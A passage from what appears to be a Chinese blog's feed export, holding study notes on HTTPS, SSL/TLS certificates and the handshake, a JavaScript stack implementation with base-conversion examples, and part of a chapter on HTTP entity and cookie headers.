服务中。有一点必须引起注意，由于该方式不同于 SSL 或者 TLS 将整个通信线路加密处理，所以内容仍有被篡改的风险。 不验证通信方的身份就有可能遭遇伪装HTTP 协议中的请求和响应不会对通信方进行确认，也就是说存在“服务器是否就是发送请求中 URI 真正指定的主机，返回响应是否真的返回到实际提出请求的客户端”等类似问题。 任何人都可以发起请求 在 HTTP 协议通信时，由于不存在确认通信方的处理步骤，任何人都可以发起请求。另外服务器只要接收到请求，不管对方是谁都会返回一个响应（但也仅限于发送端的 IP 地址和端口号没有被 Web 服务器设定限制访问的前提下） HTTP 协议的实现本身非常简单，无论是谁发送过来的请求都会返回响应，因此不确认通信方，会存在以下隐患。 无法确认请求发送至目标的 Web 服务器是否是按真实意图返回响应的那台服务器。有可能是已伪装的 Web 服务器。 无法确认响应返回到的客户端是否按真实意图接受响应的那个客户端。有可能是已伪装的客户端。 无法确定正在通信的对方是否具备访问权限。因为某些 Web 服务器上保存着重要的信息，只想发给特定用户通信的权限。 无法判定请求是来自何方、出自谁手。 即使是无意义的请求也会照单全收。无法阻止海量请求下的 DoS 攻击（Denial of Service，拒绝服务攻击） 查明对手的证书 虽然使用 HTTP 协议无法确定通信方，但如果使用 SSL 则可以。 SSL 不仅提供加密处理，而且还使用了一种被称为证书的手段。可用于确定方。 证书由值得信任的第三方机构颁发，用以证明服务器和客户端是实际存在的。另外，伪造证书从技术角度来说是异常困难的一件事。所以只要能够确认通信方（服务器或者是客户端）持有的证书。即可以判断通信方的真实意图。 通过使用证书，以证明通信方就是意料中的服务器。这对使用者个人来讲，也减少了个人信息泄露的危险性。 另外，客户端持有证书即可完成个人身份的确认，也可用于对 Web 网站的认证环节。 无法证明报文完整性，可能已遭篡改所谓完整性是指信息的准确度。若无法证明其完整性，通常意味着无法判断信息是否准确。 接受的内容可能有误 由于 HTTP 协议无法证明通信的报文完整性，因此，在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。 换句话说，没有任何办法确认，发出的请求 / 响应和接收到的请求 / 响应是前后相同的。 比如，从某个 Web 网站上下载内容，是无法确定客户端下载的文件和服务器上存放的文件是否前后一致的。文件内容在传输途中可能已经被篡改为其他的内容。即使内容真的已改变，作为接收方的客户端也是觉察不到的。像这样，请求或响应在传输途中，遭攻击者拦截并篡改内容的攻击称为中间人攻击（Man-in-the-Middle attack，MITM）。 如何防止篡改 虽然有使用 HTTP 协议确定报文完整性的方法，但事实上并不便捷、可靠。其中常用的是 MD5 和 SHA-1 等散列值校验的方法，以及用来确认文件的数字签名方法。 提供文件下载服务的 Web 网站也会提供相应的以 PGP（PrettyGood Privacy，完美隐私）创建的数字签名及 MD5 算法生成的散列值。PGP 是用来证明创建文件的数字签名，MD5 是由单向函数生成的散列值。不论使用哪一种方法，都需要操纵客户端的用户本人亲自检查验证下载的文件是否就是原来服务器上的文件。浏览器无法自动帮用户检查。可惜的是，用这些方法也依然无法百分百保证确认结果正确。因为 PGP 和 MD5 本身被改写的话，用户是没有办法意识到的。为了有效防止这些弊端，有必要使用 HTTPS。SSL 提供认证和加密处理及摘要功能。仅靠 HTTP 确保完整性是非常困难的，因此通过和其他协议组合使用来实现这个目标。 HTTP+ 加密 + 认证 + 完整性保护 = HTTPSHTTP 加上加密处理和认证以及完整性保护后即是 HTTPS如果在 HTTP 协议通信过程中使用未经加密的明文，比如在 Web 页面中输入信用卡号，如果这条通信线路遭到窃听，那么信用卡号就暴露了。另外，对于 HTTP 来说，服务器也好，客户端也好，都是没有办法确认通信方的。因为很有可能并不是和原本预想的通信方在实际通信。并且还需要考虑到接收到的报文在通信途中已经遭到篡改这一可能性。为了统一解决上述这些问题，需要在 HTTP 上再加入加密处理和认证等机制。我们把添加了加密及认证机制的 HTTP 称为 HTTPS（HTTPSecure）。 经常会在 Web 的登录页面和购物结算界面等使用 HTTPS 通信。使用HTTPS 通信时，不再用 http://，而是改用 https://。另外，当浏览器访问 HTTPS 通信有效的 Web 网站时，浏览器的地址栏内会出现一个带锁的标记。对 HTTPS 的显示方式会因浏览器的不同而有所改变。 HTTPS 是身披 SSL 外壳的 HTTPHTTPS 并非是应用层的一种新协议。只是 HTTP 通信接口部分用SSL（Secure Socket Layer）和 TLS（Transport Layer Security）协议代替而已。 通常，HTTP 直接和 TCP 通信。当使用 SSL 时，则演变成先和 SSL 通信，再由 SSL 和 TCP 通信了。简言之，所谓 HTTPS，其实就是身披SSL 协议这层外壳的 HTTP。 在采用 SSL 后，HTTP 就拥有了 HTTPS 的加密、证书和完整性保护这些功能。 SSL 是独立于 HTTP 的协议，所以不光是 HTTP 协议，其他运行在应用层的 SMTP 和 Telnet 等协议均可配合 SSL 协议使用。可以说 SSL 是当今世界上应用最为广泛的网络安全技术。 相互交换密钥的公开密钥加密技术在对 SSL 进行讲解之前，我们先来了解一下加密方法。SSL 采用一种叫做公开密钥加密（Public-key cryptography）的加密处理方式。近代的加密方法中加密算法是公开的，而密钥却是保密的。通过这种方式得以保持加密方法的安全性。加密和解密都会用到密钥。没有密钥就无法对密码解密，反过来说，任何人只要持有密钥就能解密了。如果密钥被攻击者获得，那加密也就失去了意义。 共享秘钥加密的困境 加密和解密同用一个秘钥的方式成为共享密钥加密（Common key crypto system），也被叫做对称密钥加密。 以共享密钥方式加密时必须将密钥也发给对方。那么要怎么样才能安全地发送密钥？ 使用两把密钥的公开密钥加密 公开密钥加密方式很好地解决了共享密钥加密的困难。 公开密钥加密使用一堆非对称密钥。一把叫做私有密钥（private key），另一把叫做公开密钥（public key）。顾名思义，私有密钥不能让其他任何人知道，而公开密钥则可以随意发布，任何人都可以知道。 使用公开密钥加密的方式，发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的消息后，再使用自己的私有密钥进行解密。利用这种方式，不需要发送用力解密的私有密钥，也不必担心密钥被攻击者窃听而盗走。 另外，要想根据密文和公开密钥，恢复到信息原文是异常困难的，因为解密过程就是在对离散对数进行求值，这并非轻而易举就能办到的。如果对于一个非常大的整数能做到快速地因式分解，那么密码破解还是存在希望的。但目前的技术来说不太现实。 HTTPS 采用混合加密机制 HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密机制。若密钥能够实现安全交换，那么有可能会考虑仅使用公开密钥加密通信。但是公开密钥加密与共享密钥机密相比，其处理速度要慢。 所以应充分利用两者各自的优势，将多种方法组合起来用于通信。在交换密钥环节使用公开密钥加密方式，之后的建立通信交换报文阶段则使用共享密钥加密方式。 证明公开密钥正确性的证书公开密钥加密还存在一些问题，那就是无法证明公开密钥本身就是货真价实的公开密钥。比如，正准备和某台服务器建立公开密钥加密方式下的通信时，如何证明收到的公开密钥就是原来本预想的那台服务器发型的公开密钥。或许在公开密钥传输途中，真正的公开密钥已经被攻击者替换掉了。 为了解决上述问题，可以使用数字证书认证机构（CA，Certificate Authority）和其相关机关颁发的公开密钥证书。 数字证书认证机构处于客户端与服务器双方都信赖的第三方机构的立场上。威瑞信（VeriSign）就是其中一家非常有名的数字证书认证机构。 数字证书认证机构的业务流程： 首先，服务器的运营人员向数字证书认证机构提出公开的密钥的申请。数字证书认证机构在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起。 服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端，以进行公开密钥加密方式通信。公钥证书也叫做数字证书或直接称为证书。 接到证书的客户端可使用数字证书认证机构的公开密钥，对那张证书上的数字签名进行验证，一旦验证通过，客户端便可明确两件事情：一，认证服务器的公开密钥的是真实有效的数字证书认证机构。二，服务器的公开密钥是值得信赖的。 此处认证机关的公开密钥必须安全地转发给客户端。使用通信方式时，如何安全的转交是一件困难的事情。因此，多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥。 可证明组织真实性的 EV SSL 证书 证书的一个作用是用来证明作为通信一方的服务器是否规范，另外一个作用就是确认对方服务器背后运营的企业是否真实存在。拥有该特性的证书就是 EV SSL 证书（Extended Validation SSL Certificate） EV SSL 证书 是基于国际标准的认证指导方针颁发的证书。其严格规定规定了对运营组织是否真实的确认方针，因此，通过认证的 Web 网站能够获得更高的认可度。 持有 EV SSL 证书的 Web 网站的浏览器地址栏处的背景色是绿色的。而且在左侧显示了 SSL 证书中记录的组织名称以及颁发证书的认证机构的名称。 用以确认客户端的客户端证书 HTTPS 中还可以使用客户端证书。以客户端证书进行客户端认证，证明服务器正在通信的对方始终是预料之内的客户端，其作用跟服务器证书如出一辙。 但客户端证书仍存在几处问题点。其中的一个问题就是证书的获取和发布。 想获取证书时，用户得自行安装客户端证书。但由于客户端证书是要付费使用的，且每张证书对应到每位用户也就意味着需支付和用户对等的费用。另外，要让知识层次不同的用户们自行安装证书，这件事本身也充满了各种挑战。 现状是，安全性极高的认证机构可颁发客户端证书但仅用于特殊用途的业务。比如那些可支撑客户端证书支出费用的业务。 客户端证书存在的另一个问题点是，客户端证书毕竟只用来证明客户端实际存在，而不能用来证明用户本人的真实有效性。也就是说，只要获得了安装有客户端证书的计算机的使用权限，也就意味着同时拥有了客户端证书的使用权限。 认证机构信誉第一 SSL 机制中介入认证机构之所以可行，是因为建立在其信用绝对可靠这一大前提下的。然而，2011 年 7 月，荷兰的一家名叫DigiNotar 的认证机构曾遭黑客不法入侵，颁布了 google.com 和twitter.com 等网站的伪造证书事件。这一事件从根本上撼动了SSL 的可信度。因为伪造证书上有正规认证机构的数字签名，所以浏览器会判定该证书是正当的。当伪造的证书被用做服务器伪装之时，用户根本无法察觉到。虽然存在可将证书无效化的证书吊销列表（Certificate Revocation List，CRL）机制，以及从客户端删除根证书颁发机构（Root Certificate Authority，RCA）的对策，但是距离生效还需要一段时间，而在这段时间内，到底会有多少用户的利益蒙受损失就不得而知了。 由自认证机构颁发的证书称为自签名证书 如果使用 OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。但该服务器证书在互联网上不可作为证书使用，似乎没什么帮助。独立构建的认证机构叫做自认证机构，由自认证机构颁发的“无用”证书也被戏称为自签名证书。浏览器访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。 由自认证机构颁发的服务器证书之所以不起作用，是因为它无法消除伪装的可能性。自认证机构能够产生的作用顶多也就是自己对外宣称“我是○○”的这种程度。即使采用自签名证书，通过 SSL加密之后，可能偶尔还会看见通信处在安全状态的提示，可那也是有问题的。因为 就算加密通信，也不能排除正在和已经过伪装的假服务器保持通信。 值得信赖的第三方机构介入认证，才能让已植入在浏览器内的认证机构颁布的公开密钥发挥作用，并借此证明服务器的真实性。 中级认证机构的证书可能会变成自认证证书多数浏览器内预先已植入备受信赖的认证机构的证书，但也有一小部分浏览器会植入中级认证机构的证书。对于中级认证机构颁发的服务器证书，某些浏览器会以正规的证书来对待，可有的浏览器会当作自签名证书。 HTTPS 的安全通信机制 HTTPS 的通信步骤 客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包含了客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所有使用的加密算法及密钥的长度等） 服务器可进行 SSL 通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL 版本和加密组件。服务器的加密组件内容是从接受的客户端加密组件内筛选出来的。 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL 握手协商部分结束。 SSL 第一次握手结束之后，客户端会以 Client Key Exchange 报文作为回应。报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串。该报文与用步骤3 中的公开密钥进行加密。 接着客户端继续发送 Change Cipher Spec 报文。该报文汇提示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。 客户端发送 Finished 报文。该报文包含连接至今全部报文的 整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。 服务器同样发送 Change Cipher Spec 报文。 服务器同样发送 Finished 报文； 服务器和客户端的 Finished 报文交换完毕后， SSL 连接就算建立完成了。当然，通信会受到 SSL 的保护。从此处开始进行应用层的通信，即发送 HTTP 请求。 应用层协议通信，即发送 HTTP 响应。 最后由客户端断开连接。断开连接时，发送 close_notify 报文。 在以上流程中，应用层发送数据时会附件一种叫做 MAC（Message Authentication Code）的报文摘要。MAC 能够查知报文是否遭到篡改，从而保证了报文的完整性。 下面是对整个流程的图解。图中说明了从仅适用服务器端的公开密钥证书（服务器证书）建立整个 HTTPS 通信的整个过程。 SSL 和 TLS HTTPS 使用 SSL （Secure Socket Layer）和 TLS （Transport Layer Security）这两个协议。 SSL 技术最初是由浏览器开发商网景通信公司率先倡导的，开发过 SSL3.0 之前的版本。目前主导权已转移到 IETF（InternetEngineering Task Force，Internet 工程任务组）的手中。 IETF 以 SSL3.0 为基准，后又制定了 TLS1.0、TLS1.1 和TLS1.2。TSL 是以 SSL 为原型开发的协议，有时会统一称该协议为 SSL。当前主流的版本是 SSL3.0 和 TLS1.0。 由于 SSL1.0 协议在设计之初被发现出了问题，就没有实际投入使用。SSL2.0 也被发现存在问题，所以很多浏览器直接废除了该协议版本。 SSL 速度慢吗 HTTPS 也存在一些问题，那就是当使用 SSL 时，它的处理速度会变慢。 SSL 的慢分成两种。一种是指通信慢。另一种是指由于大量消耗CPU 以及内存等资源，导致处理速度变慢。 和使用 HTTP 相比，网络负载可能会慢2到100倍。除去和 TCP 连接、发送 HTTP 请求响应以外，还必须进行 SSL 通信，因此整体上处理通信量不可避免会增加。 另一点是 SSL 必须进行加密处理。在服务器和客户端都需要进行加密和解密的运算处理。因此从结果上讲，比起 HTTP 会更多地消耗服务器和客户端的硬件资源，导致负载增强。 针对速度变慢这一问题，并没有根本性的解决方案，我们会使用SSL 加速器这种（专用服务器）硬件来改善该问题。该硬件为SSL 通信专用硬件，相对软件来讲，能够提高数倍 SSL 的计算速度。仅在 SSL 处理时发挥 SSL 加速器的功效，以分担负载。 为什么不一直使用 HTTPS中一个原因是，因为与纯文本通信相比，加密通信会消耗更多的CPU 及内存资源。如果每次通信都加密，会消耗相当多的资源，平摊到一台计算机上时，能够处理的请求数量必定也会随之减少。 因此，如果是非敏感信息则使用 HTTP 通信，只有在包含个人信息等敏感数据时，才利用 HTTPS 加密通信。 特别是每当那些访问量较多的 Web 网站在进行加密处理时，它们所承担着的负载不容小觑。在进行加密处理时，并非对所有内容都进行加密处理，而是仅在那些需要信息隐藏时才会加密，以节约资源。 除此之外，想要节约购买证书的开销也是原因之一。 要进行 HTTPS 通信，证书是必不可少的。而使用的证书必须向认证机构（CA）购买。证书价格可能会根据不同的认证机构略有不同。通常，一年的授权需要数万日元（现在一万日元大约折合 600人民币）。那些购买证书并不合算的服务以及一些个人网站，可能只会选择采用 HTTP 的通信方式。 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我要放弃javaScript数据结构与算法（第三章）—— 栈]]></title>
    <url>%2F2018-08-25-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part3.html</url>
    <content type="text"><![CDATA[有两种结构类似于数组，但在添加和删除元素时更加可控，它们就是栈和队列。 第三章 栈栈数据结构栈是一种遵循后进先出（LIFO）原则的有序集合。新添加的或待删除的元素都保存在栈的同一端，称为栈顶，另一端就叫做栈底。在栈里， 新元素都靠近栈顶，旧元素都接近栈底。 栈也被用在编程语言的编译器和内存中保存变量、方法调用等。 创建栈 先声明这个类 123function Stack()&#123; // 各种属性和方法的声明&#125; 选择数组这种数据结构来保存栈里的元素 1let items = []; 为栈声明一些方法 push（element（s））： 添加一个（或者几个）新元素到栈顶 pop（）：移除栈顶的元素，同时返回被移除的元素 peek（）：返回栈顶的元素，不会对栈做任何修改（这个方法不会移除栈顶的元素，仅仅返回它） isEmpty（）：如果栈里没有任何元素的就返回true，否则就返回false. clear（）：移除栈里的所有元素 size（）：返回栈里的元素个数，这个方法和数组的length属性很类似。 向栈添加元素我们要实现的第一个方法是 push,这个方法负责向栈里添加新元素，该方法只添加元素到栈顶，也就是栈的末尾。 123this.push = function(element)&#123; return items.push(element);&#125; 只能用 push 和 pop 方法添加和删除栈中元素，这样一来，我们的栈就自然遵从了 LIFO 原则。 向栈移除元素 我们要实现的第一个方法是 pop,这个方法主要用来移除栈里的元素。栈遵从 LIFO 原则，因此移出的是最后添加进去的元素。栈的 pop 方法可以这么写 123this.pop = function()&#123; return items.pop();&#125; 只能用 push 和 pop 方法添加和删除栈中元素，这样一来，我们的栈就自然遵从了 LIFO 原则。 查看栈顶元素现在为类实现一些额外的辅助方法，如果想知道栈里最后添加的元素是什么，可以用 peek 方法，这个方法将返回栈顶的元素。 123this.peek = function()&#123; return items[items.length-1];&#125; 因为类内部是用数组保存元素的，所以访问数组的最后一个元素可以用 length - 1 检查栈是否为空 isEmpty ,如果栈为空的话就返回true，否则就返回false 123this.isEmpty = function()&#123; return items.length == 0;&#125; 类似于数组的 length 属性，我们也能实现栈的 length,对于集合，最好用 size 代替 length。因为栈的内部使用数组保存元素，所以能简单地返回栈的长度。 123this.size = function()&#123; return items.length;&#125; 清空和打印栈元素实现 clear 方法。clear 方法用来移除栈里所有的元素，把栈清空。实现这个方法最简单的方式是 1234this.clear = function()&#123; items = []; return null;&#125; 打印出来栈里面的内容，通过实现辅助方法 print 来实现。 123this.print = function()&#123; console.log(items.toString());&#125; 实例12345678910111213141516171819202122232425262728293031323334function Stack()&#123; let items = []; this.push = function(element)&#123; return items.push(element); &#125; this.pop = function()&#123; return items.pop(); &#125; this.peek = function()&#123; return items[items.length-1]; &#125; this.isEmpty = function()&#123; return items.length == 0; &#125; this.size = function()&#123; return items.length; &#125; this.clear = function()&#123; items = []; &#125; this.print = function()&#123; console.log(items.toString()); &#125; &#125;let stack = new Stack();console.log(stack.isEmpty()); // true 判断是否为空stack.push(5); // 往栈里添加元素 5stack.push(8); // 往栈里添加元素 8console.log(stack.peek()); // 查看最后一个元素 8stack.push(11); // 往栈里添加元素 11console.log(stack.size()); // 3 输出栈的元素个数console.log(stack.isEmpty()); // false 判断是否为空stack.push(15); // 往栈里添加元素 15stack.print(); // 5,8,11,15 输出栈里的元素 下面是流程图 ECMAScript6 和 Stack 类创建了一个可以当做类来使用的 Stack 函数。JavaScript 函数都有构造函数，可以用来模拟类的行为。我们声明一个私有的 items变量，它只能被 Stack 函数/类访问。然而，这个方法为每个类的实例都创建了一个 items 变量的副本。因此如果要创建多个 Stack实例，就不太适合。我们可以尝试用 ES6语法来声明 Stack 类。 用 ES6 声明 Stack 类123456789class Stack&#123; constructor()&#123; this.items = []; // &#123;1&#125; &#125; push(elememt)&#123; this.items.push(element); &#125; // 其他方法&#125; 只是用 ES6 的简化语法把 Stack 函数转换成 Stack 类。这种方法不能像其他语言（Java、C++、C#）一样直接在类里面声明变量，只能在类的构造函数 constructor 里声明，在类的其他函数里用 this.nameofVariable 就可以引用这个变量。 尽管代码看起来更加简洁、更漂亮，变量 items 却是公共的。ES6 类是基于原型的。虽然基于原型的类比基于函数的类更节省内存，也更适合创建多个实例，却不能够声明私有属性（变量）或方法。而且，在这种情况下，我们希望 Stack 类的用户只能访问暴露给类的方法。否则，就有可能从栈的中间移除元素（因为我们用数组来存储其值），这不是我们希望看到的。 用ES6的限定作用域 Symbol 实现类ES6 新增了一种叫做 Symbol 的基本类型，它是不可变的，可以用作对象的属性。 123456789101112131415161718192021222324252627let _items = Symbol(); // 声明了 Symbol 类型的变量class Stack&#123; constructor()&#123; this[_items] = [] // 要访问 _items,只需把所有的 this.items都换成 this.[_items] &#125; push(element)&#123; return this[_items].push(element); &#125; pop ()&#123; return this[_items].pop(); &#125; peek ()&#123; return this[_items][this[_items].length-1]; &#125; isEmpty ()&#123; return this[_items].length == 0; &#125; size ()&#123; return this[_items].length; &#125; clear ()&#123; this[_items] = []; &#125; print ()&#123; console.log(this[_items].toString()); &#125;&#125; 这种方法创建了一个假的私有属性，因为ES6 新增的Object.getOwnPropertySymbols 方法能够取到类里面声明的所有 Symbols 属性。下面是一个破坏 Stack 类的例子 123456789let stack = new Stack();stack.push(5);stack.push(8);let objectSymbols = Object.getOwnPropertySymbols(stack);console.log(objectSymbols.length); // 1console.log(objectSymbols); // [Symbol()]console.log(objectSymbols[0]); // Symbol()stack[objectSymbols[0]].push(1); stack.print(); // 5,8,1 很明显可以通过访问 stack[objectSymbol[0]] 得到 _items。并且 _items属性是一个数组，可以进行任意的数组操作，比如从中间删除或者是添加元素。我们操作的是栈，不应该有这种行为出现。 用ES6类的 WeakMap 实现类有一种数据类型可确保属性是私有的，这就是 WeakMap。后面会深入探讨 Map 这种数据结构，现在只需要知道 WeakMap 可以存储键值对，其中键是对象，值可以是任意数据类型。 如果使用 WeakMap 来存储 items 变量，那么 Stack 类是这样的 1234567891011121314151617181920212223242526272829303132333435const items = new WeakMap(); // 声明了一个 WeakMap 类型的变量 itemsclass Stack&#123; constructor()&#123; items.set(this, []) // 在 constructor 中，以this（Stack类自己引用）为键，把代表栈的数组存入 items &#125; push(element)&#123; let s = items.get(this); s.push(element); &#125; pop ()&#123; let s = items.get(this); let r = s.pop(); return r; &#125; peek ()&#123; let s = items.get(this); return s[s.length-1]; &#125; isEmpty ()&#123; let s = items.get(this); return s.length == 0; &#125; size ()&#123; let s = items.get(this); let r = s.length return r; &#125; clear ()&#123; items.set(this, []) &#125; print ()&#123; let s = items.get(this); console.log(s.toString()); &#125;&#125; 现在 items 在 Stack 类里是真正的私有属性了，但是还有一件事要做， items 现在仍然是在 Stack 类以外声明的，因此任何谁都可以改动它。我们可以用一个闭包（外层函数）把 Stack 类包起来，这样就可以在这个函数里访问 WeakMap 12345678910let stack = (function()&#123; const items = new WeakMap(); class Stack &#123; constructor()&#123; items.set(this, []); &#125; // 其他方法 &#125; return Stack; // 当 Stack 函数里的构造函数被调用时，会返回 Stack 类的一个实例。&#125;)() 现在，Stack 类有一个名为 items 的私有属性。然后用这种方法的话，扩展类无法继承其属性。将其与最开始用 function 实现的 Stack 类来做个比较，我们会发现一些相似之处。 事实上，尽管 ES6 引入了类的语法，我们仍然不能像在其他编程语言中一样声明私有属性或方法。有很多种方法都可以达到相同的效果，但无论是语法还是性能，这些方法都有各自的缺点和优点。 用栈解决问题栈的实际应用非常广泛。在回溯问题中，它可以存储访问过的任务或是路径、撤销的操作。Java 和 C# 用栈来存储变量和方法调用，特别是处理递归算法时，有可能抛出一个栈溢出异常（stack overflow） 下面，学习使用栈的三个最著名的算法实例。首先是十进制转二进制的问题，以及任意进制转换的算法，然后是平衡圆括号问题，最后，会学习栈解决汉诺塔的问题。 从十进制到二进制计算科学中，二进制非常重要，因为计算机里的所有内容都是用二进制数字表示（0和1）。没有十进制和二进制相互转化的能力，与计算机交流就很困难。要把十进制化成十进制，将该十进制数字和2整除，直到结果为0为止。 实例:数字10转为二进制的数字。 123456789101112131415161718function divideBy2(decNumber)&#123; var remStack = new Stack(), rem, binaryString = ''; while(decNumber &gt; 0)&#123; rem = Math.floor(decNumber % 2); // 拿到被2整除的余数 remStack.push(rem); decNumber = Math.floor(decNumber / 2) // 拿到被2整除的整数 &#125; while (! remStack.isEmpty())&#123; binaryString += remStack.pop().toString(); &#125; return binaryString;&#125;console.log(divideBy2(10)); // 1010console.log(divideBy2(233)); // 11101001console.log(divideBy2(100)); // 11101001 JavaScript有数字类型，但是不会区分究竟是整数还是浮点数，使用 Math.floor 让除法只返回整数部分。 进制转换算法可以传入任意进制的基数作为参数 123456789101112131415161718function baseConverter(decNumber, base)&#123; var remStack = new Stack(), rem, baseString = '', digits = '0123456789ABCDEF'; while(decNumber &gt; 0)&#123; rem = Math.floor(decNumber % base); // 拿到被base整除的余数 remStack.push(rem); decNumber = Math.floor(decNumber / base) // 拿到被base整除的整数 &#125; while (! remStack.isEmpty())&#123; baseString += digits[remStack.pop()]; &#125; return baseString;&#125;console.log(baseConverter(100345,2)); // 11000011111111001console.log(baseConverter(100345, 8)); // 303771console.log(baseConverter(100345, 16)); // 187F9 需要改动的地方：在将十进制转为二进制的时候，余数是0或者1，转为八进制的时候，余数为0~7，同理16进制是0~9加上A~F。所以要做个转换，通过定义 digits ，digits[remStack.pop()] 来实现转化。 小结通过这一章，学习了栈这一数据结构的相关内容。可以用代码自己实现栈，还讲解了栈里面的相关方法。 书籍链接： 学习JavaScript数据结构与算法]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第六章下）—— HTTP 首部]]></title>
    <url>%2F2018-08-23-read-%E5%9B%BE%E8%A7%A3HTTP-Part6%E4%B8%8B.html</url>
    <content type="text"><![CDATA[继续完成 HTTP 首部的最后一小部分。 第六章 HTTP 首部（下）实体首部字段实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等于实体相关的消息。 Allow 1Allow: GET, HEAD 首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的的所有 HTTP 方法。当服务器接收不到不支持的 HTTP 方法时，会以状态码 405 Method Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。 Content-Encoding1Content-Encoding: gzip 首部字段 Content-Encoding 会告知客户端服务器对实体的主体部分选用的内容编码方式。内容编码是指在不丢失实体消息的前提下所进行的压缩。 主要采用以下4种内容编码的内容。 gzip compress deflate identity Content-Language1Content-Language: zh-CN 首部字段 Content-Language 会告知客户端，实体主体使用的自然语言（指中文或者英文等语言）。 Content-Location1Content-Location: http://www.hackr.jp/index-ja.html Content-MD5 图：客户端会对接收的报文主体执行相同的 MD5 算法，然后与首部字段 Content-MD5 的字段值比较 1Content-MD5: OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY== 首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检查报文在传输过程中是否保持完整，以及确认传输到达。 对报文主体执行 MD5 算法获得 128 位二进制数，再通过 Base64 编码后将结果写入 Content-MD5 字段值，由于 HTTP 首部无法记录二进制，所以要通过 Base64 编码处理。为确保报文的有效性，作为接收方的客户端会对报文主体再执行一次相同的MD5 算法。计算出的值与字段值作比较后，即可判断出报文主体的准确性。 采用这种方法，对内容上的偶发性改变是无从查证的，也无法检测出恶意篡改。其中一个原因在于，内容如果能够被篡改，那么同时意味着 Content-MD5 也可重新计算然后被篡改。所以处在接收阶段的客户端是无法意识到报文主体以及首部字段 Content-MD5 是已经被篡改过的。 Content-Range 1Content-Range: bytes 5001-10000/10000 针对范围请求，返回响应时使用的首部字段 Content-Range ，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小。 Content-Type1Content-Type: text/html; charset=UTF-8 首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。 参数 charset 使用 iso-8859-1 或 euc-jp 等字符集进行赋值。 Expires1Expires: Wed, 04 Jul 2012 08:26:05 GMT 首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。 源服务器不希望缓存服务器对资源缓存时，最好在 Expires 字段内写入与首部字段 Date 相同的时间值。 但是，当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字段 Expires ，会优先处理 max-age 指令。 Last-Modified1Last-Modified: Wed, 23 May 2012 09:59:55 GMT 首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进行动态数据处理时，该值有可能会被变成数据最终修改时的时间。 为 Cookie 服务的首部字段管理服务器与客户端之间状态的 Cookie，虽然没有被编入标准化HTTP/1.1 的 RFC2616 中，但在 Web 网站方面得到了广泛的应用。Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接着当用户访问该Web网站时，可通过通信方式取回之前发放Cookie。调用 Cookie 时，由于可校验 Cookie 的有效期，以及发送方的域、路径、协议等信息，所以正规发布的 Cookie 内的数据不会因来自其他Web 站点和攻击者的攻击而泄露。 至 2013 年 5 月，Cookie 的规格标准文档有以下 4 种。由网景公司颁布的规格标准网景通信公司设计并开发了 Cookie，并制定相关的规格标准。1994年前后，Cookie 正式应用在网景浏览器中。目前最为普及的 Cookie方式也是以此为基准的。 RFC2109某企业尝试以独立技术对 Cookie 规格进行标准化统筹。原本的意图是想和网景公司制定的标准交互应用，可惜发生了微妙的差异。现在该标准已淡出了人们的视线。 RFC2965为终结 Internet Explorer 浏览器与 Netscape Navigator 的标准差异而导致的浏览器战争，RFC2965 内定义了新的 HTTP 首部 Set-Cookie2 和Cookie2。可事实上，它们几乎没怎么投入使用。 RFC6265将网景公司制定的标准作为业界事实标准（De facto standard），重新定义 Cookie 标准后的产物。目前使用最广泛的 Cookie 标准却不是 RFC 中定义的任何一个。而是在网景公司制定的标准上进行扩展后的产物。本节接下来就对目前使用最为广泛普及的标准进行说明。下面的表格内列举了与 Cookie 有关的首部字段。 首部字段名 说明 首部类型 Set-Cookie 开始状态管理所使用的 Cookie 消息 响应首部字段 Cookie 服务器接收到的 Cookie 信息 请求首部字段 Set-Cookie1Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; 当服务器准备开始管理客户端的状态时，会事先告知各种信息。 下面的表格列举了 Set-Cookie 的字段值。 属性 说明 NAME=VALUE 赋予 Cookie 的名称和其值（必需项） expires=DATE Cookie 